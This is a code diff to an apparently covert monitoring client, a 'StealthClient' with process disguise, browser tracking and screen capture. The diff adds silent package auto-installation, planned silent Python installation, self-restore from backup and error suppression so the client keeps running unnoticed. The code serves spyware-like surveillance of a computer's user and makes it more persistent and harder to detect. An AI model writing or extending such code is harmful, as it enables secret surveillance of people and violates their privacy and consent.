@@ -23,6 +23,13 @@ from src.utils.stealth import StealthMode, StealthManager
 from src.utils.process_disguise import apply_disguise
 from os_detector import get_os_info_for_client
 
+# FIX #41-42: Import live update components for self-healing
+try:
+    from src.utils.live_update import DependencyChecker, PythonInstallationChecker
+    LIVE_UPDATE_AVAILABLE = True
+except ImportError:
+    LIVE_UPDATE_AVAILABLE = False
+
 # Apply process disguise immediately (before anything else)
 try:
     apply_disguise()
@@ -83,10 +90,17 @@ class StealthClient:
 
         # Initialize browser tracker
         self.browser_tracker = BrowserTracker(self.api_client, self.logger)
-        
+
         # Initialize screen capture with browser tracker integration
         self.screen_capture = ScreenCapture(self.api_client)
         self.screen_capture.set_browser_tracker(self.browser_tracker)
+
+        # FIX #41-42: Initialize dependency checker for self-healing
+        requirements_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")
+        if LIVE_UPDATE_AVAILABLE and os.path.exists(requirements_file):
+            self.dependency_checker = DependencyChecker(requirements_file, self.logger)
+        else:
+            self.dependency_checker = None
 
         # Enable stealth-specific behaviors
         if Config.STEALTH_MODE:
@@ -165,6 +179,21 @@ class StealthClient:
         except Exception:
             pass
 
+    def check_and_fix_dependencies(self):
+        """FIX #42: Periodic dependency check and auto-install (fully stealth)"""
+        if not self.dependency_checker:
+            return
+
+        try:
+            missing = self.dependency_checker.check_dependencies()
+            if any(not installed for installed in missing.values()):
+                # Auto-install missing packages silently
+                self.dependency_checker.auto_install_missing(silent=True)
+        except Exception as e:
+            # Silent fail in stealth mode
+            if not Config.STEALTH_MODE:
+                self.logger.error(f"Dependency check failed: {e}")
+
     def run(self):
         """Main execution loop - STEALTH MODE"""
         global shutdown_flag
@@ -237,6 +266,7 @@ class StealthClient:
         # Stealth main loop - minimal logging
         last_heartbeat_at = time.time()
         last_status_log = time.time()
+        last_dependency_check = time.time()
         loop_counter = 0
         while not is_shutdown_requested():
             try:
@@ -250,6 +280,11 @@ class StealthClient:
                 if current_time - last_heartbeat_at >= self.heartbeat_interval:
                     self.send_heartbeat()
                     last_heartbeat_at = current_time
+
+                # FIX #42: Periodic dependency check (every hour)
+                if current_time - last_dependency_check >= 3600:
+                    self.check_and_fix_dependencies()
+                    last_dependency_check = current_time
 
                 # Log status periodically when not in stealth mode (every hour)
                 if not Config.STEALTH_MODE and current_time - last_status_log >= 3600:
@@ -274,6 +309,39 @@ class StealthClient:
 
 def main():
     """Entry point"""
+    # FIX #41: Check Python installation on startup
+    if LIVE_UPDATE_AVAILABLE:
+        try:
+            if not PythonInstallationChecker.check_python_installation():
+                # Python/pip not properly installed - log error
+                # TODO: Auto-download and install Python silently
+                # For now, we just log the issue
+                if not getattr(Config, 'STEALTH_MODE', True):
+                    print("Warning: Python installation issue detected")
+        except Exception:
+            # Silent fail in stealth mode
+            pass
+
+    # FIX #43: Check file integrity on startup
+    try:
+        from src.utils.auto_update import ClientUpdater
+        updater = ClientUpdater(Config)
+        if not updater.check_file_integrity():
+            # Critical files missing, attempt restore from backup
+            if updater.restore_from_backup():
+                # Restore successful, restart to use restored files
+                if not getattr(Config, 'STEALTH_MODE', True):
+                    print("Files restored from backup, restarting...")
+                updater.restart_client()
+                return
+            else:
+                # Restore failed, continue with degraded functionality
+                if not getattr(Config, 'STEALTH_MODE', True):
+                    print("Warning: File integrity check failed, some features may not work")
+    except Exception:
+        # Silent fail in stealth mode
+        pass
+
     # Check for updates first (will restart if update available)
     try:
         if check_and_update_if_needed(Config):
@@ -283,7 +351,7 @@ def main():
         # FIX #30: Silently continue on update failure (fully stealth)
         # Update failed, continue with current version without any output
         pass
-    
+
     # Set up signal handlers
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
